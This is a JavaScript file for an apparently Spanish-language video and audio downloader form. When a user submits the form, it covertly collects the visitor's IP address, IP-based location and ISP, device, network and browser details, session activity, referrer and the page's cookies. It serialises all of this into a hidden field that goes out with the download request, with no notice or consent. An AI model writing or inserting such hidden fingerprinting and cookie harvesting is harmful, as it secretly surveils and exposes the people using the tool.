let sessionStartTime = Date.now();
let pageViews = 1;
let userInteractions = 0;
let isSubmitting = false; 

document.addEventListener('click', () => userInteractions++);
document.addEventListener('keypress', () => userInteractions++);

const form = document.getElementById("downloadForm");
const select = document.getElementById("typeSelect");
const userInfoField = document.getElementById("userInfoField");
const submitBtn = document.getElementById("submitBtn");

async function getUserIP() {
  try {
    const response = await fetch("https://api.ipify.org?format=json");
    const data = await response.json();
    return data.ip;
  } catch (error) {
    return 'No disponible';
  }
}

async function getLocationInfo() {
  try {
    const response = await fetch("http://ip-api.com/json/");
    const data = await response.json();
    return {
      country: data.country || 'Unknown',
      region: data.regionName || 'Unknown',
      city: data.city || 'Unknown',
      timezone: data.timezone || 'Unknown',
      isp: data.isp || 'Unknown'
    };
  } catch (error) {
    return {
      country: 'Unknown',
      region: 'Unknown', 
      city: 'Unknown',
      timezone: 'Unknown',
      isp: 'Unknown'
    };
  }
}

function getNetworkInfo() {
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  
  return {
    connection_type: connection ? connection.effectiveType : 'unknown',
    download_speed: connection ? connection.downlink + ' Mbps' : 'unknown',
    rtt: connection ? connection.rtt + ' ms' : 'unknown',
    save_data: connection ? connection.saveData : false
  };
}

function getDeviceInfo() {
  return {
    screen_resolution: `${screen.width}x${screen.height}`,
    viewport_size: `${window.innerWidth}x${window.innerHeight}`,
    color_depth: screen.colorDepth,
    pixel_ratio: window.devicePixelRatio || 1,
    orientation: screen.orientation ? screen.orientation.type : 'unknown',
    touch_support: 'ontouchstart' in window,
    hardware_concurrency: navigator.hardwareConcurrency || 'unknown'
  };
}

function getBrowserFeatures() {
  return {
    cookies_enabled: navigator.cookieEnabled,
    local_storage: typeof(Storage) !== "undefined",
    session_storage: typeof(sessionStorage) !== "undefined",
    webgl_support: !!window.WebGLRenderingContext,
    canvas_support: !!document.createElement('canvas').getContext,
    geolocation_support: !!navigator.geolocation,
    notification_support: "Notification" in window,
    service_worker_support: 'serviceWorker' in navigator
  };
}

function getSessionInfo() {
  const sessionDuration = Math.floor((Date.now() - sessionStartTime) / 1000);
  
  return {
    session_duration: sessionDuration,
    page_views: pageViews,
    user_interactions: userInteractions,
    referrer: document.referrer || 'direct',
    page_title: document.title,
    page_url: window.location.href,
    scroll_depth: Math.floor((window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100) || 0
  };
}

async function buildUserInfo() {
  
  const userIP = await getUserIP();
  const locationInfo = await getLocationInfo();
  const networkInfo = getNetworkInfo();
  const deviceInfo = getDeviceInfo();
  const browserFeatures = getBrowserFeatures();
  const sessionInfo = getSessionInfo();
  
  const formData = {
    video_url: document.querySelector('input[name="video_url"]').value,
    format: select.value,
    quality: document.querySelector('select[name="quality"]').value
  };
  
  const completeUserInfo = {
    user_ip: userIP,
    timestamp: new Date().toISOString(),
    
    browser: navigator.userAgent,
    language: navigator.language,
    languages: navigator.languages,
    platform: navigator.platform,
    
    ...deviceInfo,
    
    ...networkInfo,
    
    ...locationInfo,
    
    browser_features: browserFeatures,
    
    ...sessionInfo,
    
    ...formData,
    
    cookies: document.cookie,
    local_time: new Date().toString(),
    user_timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    
    performance: window.performance ? {
      navigation_type: performance.navigation ? performance.navigation.type : 'unknown',
      page_load_time: performance.timing ? (performance.timing.loadEventEnd - performance.timing.navigationStart) : 'unknown'
    } : 'not_available'
  };
  
  return completeUserInfo;
}

function restoreButtonAfterTimeout() {
  setTimeout(() => {
    if (isSubmitting) {
      submitBtn.innerHTML = '<i class="fas fa-download me-2"></i> Descargar ahora';
      submitBtn.disabled = false;
      isSubmitting = false;
    }
  }, 10000);
}

form.addEventListener("submit", async function (e) {
  e.preventDefault();
  
  if (isSubmitting) {
    return;
  }
  
  isSubmitting = true;
  
    const audioURL = document.getElementById('urlDescargarAudio').value;
    const videoURL = document.getElementById('urlDescargarVideo').value;

    const form = document.getElementById('downloadForm');
    const select = document.getElementById('typeSelect');

    select.addEventListener('change', () => {
    if (select.value === "audio") {
        form.action = audioURL;
    } else {
        form.action = videoURL;
    }
    });
    
  try {
    const originalText = submitBtn.innerHTML;
    submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin me-2"></i> Procesando...';
    submitBtn.disabled = true;
    
    restoreButtonAfterTimeout();
    
    const userInfo = await buildUserInfo();

    userInfoField.value = JSON.stringify(userInfo);
    
    
    form.submit();
    
  } catch (error) {
    
    submitBtn.innerHTML = '<i class="fas fa-download me-2"></i> Descargar ahora';
    submitBtn.disabled = false;
    isSubmitting = false;
    
    alert('Error al procesar la solicitud. Por favor, inténtalo de nuevo.');
  }
});

document.addEventListener('visibilitychange', function() {
  if (!document.hidden && isSubmitting) {
    setTimeout(() => {
      if (isSubmitting) {
        submitBtn.innerHTML = '<i class="fas fa-download me-2"></i> Descargar ahora';
        submitBtn.disabled = false;
        isSubmitting = false;
      }
    }, 1000);
  }
  
  if (!document.hidden) {
        pageViews++;
  }
});
